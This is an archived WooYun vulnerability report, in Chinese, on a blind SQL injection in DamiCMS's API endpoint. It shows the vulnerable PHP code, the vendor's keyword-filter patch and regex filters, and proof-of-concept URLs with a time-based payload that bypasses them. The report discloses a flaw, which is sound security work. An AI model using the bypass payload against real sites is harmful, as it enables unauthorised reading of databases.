{"id": 43740, "wybug_id": "wooyun-2014-081842", "wybug_title": "大米CMS某处SQL盲注3绕过补丁及防御", "wybug_corp": "damicms.com", "wybug_author": "xfkxfk", "wybug_date": "2014-11-04 18:37", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-04：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 大米CMS某处SQL盲注3，绕过最新补丁及系统新增防御 详细说明：  原始漏洞连接： WooYun: 大米CMS某处SQL盲注2 官方在当天就出了最新版，修复了此漏洞而且还加了全局防御，但是仍然可以绕过进行盲注文件/Web/Lib/Action/ApiAction.class.php\n//万能获取数据接口function ajax_arclist(){$prefix = !empty($_REQUEST['prefix'])?(bool)$_REQUEST['prefix']:true;\t\t //表过滤防止泄露信息,只允许的表\t\t if(!in_array($_REQUEST['model'],array('article','type','ad','label','link'))){exit();}\t\t if(!empty($_REQUEST['model'])){\t\t if($prefix == true){\t\t $model = C('DB_PREFIX').$_REQUEST['model'];\t\t }\t\t else{\t\t$model =\t$_REQUEST['model'];\t\t } \t\t }else{\t\t$model = C('DB_PREFIX').'article';\t\t }           $order     =!empty($_REQUEST['order'])?inject_check($_REQUEST['order']):'';         $num       =!empty($_REQUEST['num'])?inject_check($_REQUEST['num']):'';         $where     =!empty($_REQUEST['where'])?inject_check(urldecode($_REQUEST['where'])):'';         //使where支持 条件判断,添加不等于的判断         $page=false;         if(!empty($_REQUEST['page'])) $page=(bool)$_REQUEST['page'];             $pagesize  =!empty($_REQUEST['pagesize'])?intval($_REQUEST['pagesize']):'10';         //$query     =!empty($_REQUEST['sql'])?$_REQUEST['sql']:'';//太危险不用         $field     =!empty($_REQUEST['field'])?inject_check($_REQUEST['field']):'';\t         $m=new Model($model,\"\",false);\t          //如果使用了分页,缓存也不生效         if($page){               import(\"@.ORG.Page\");     //这里改成你的Page类                         $count=$m->where($where)->count();              $total_page = ceil($count / $pagesize);              $p = new Page($count,$pagesize);               //如果使用了分页，num将不起作用               $t=$m->field($field)->where($where)->limit($p->firstRow.','.$p->listRows)->order($order)->select();\t\t\t   //echo $m->getLastSql();\t\t\t   \t\t\t   $ret = array('total_page'=>$total_page,'data'=>$t);\t\t\t            }         //如果没有使用分页，并且没有 query         if(!$page){             $ret=$m->field($field)->where($where)->order($order)->limit($num)->select();         }\t\t          $this->ajaxReturn($ret,'返回信息',1);\t\t }\n在修复是：1、这里的\n$where     =!empty($_REQUEST['where'])?urldecode($_REQUEST['where']):'';\n被修改为：\n$where     =!empty($_REQUEST['where'])?inject_check(urldecode($_REQUEST['where'])):'';\n添加了系统自带的inject_check函数\n//防止sql注入\tfunction inject_check($str)\t{\t\t$tmp=eregi('select|insert|update|and|or|delete|\\'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile', $str);\t\tif($tmp)\t\t{\t\talert(\"非法操作!\",3);\t\t}\t\telse\t\t{\t\t\treturn $str;\t\t}\t}\n过滤了一些SQL关键字2、这里还在全局添加了php_safe.php文件过滤的内容如下：\n$getfilter=\"'|(and|or)\\\\b.+?(>|<|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";$postfilter=\"\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";$cookiefilter=\"\\\\b(and|or)\\\\b.{1,6}?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\n通上面的两个更新，但是仍然可以绕过   漏洞证明：  \nhttp://localhost/dami/index.php?s=/api/ajax_arclist/model/article/where/123+%26+1=if(hex(mid(user(),1,1))=72,sleep(1),1)\n延时\n\n\nhttp://localhost/dami/index.php?s=/api/ajax_arclist/model/article/where/123+%26+1=if(hex(mid(user(),1,1))=73,sleep(1),1)\n\n\npython跑数据脚本见测试代码脚本跑user()结果：\n\n   修复方案：  intval($_REQUEST['where'])   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复： 这和暴力猜解一个原理 只要有安全意识的基本会更改mysql用户名和密码，何况别人不开外链，即使猜解出用户名密码 还是没用.不过这提醒了我防注入函数写的不够严，可以将hex加入进去 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}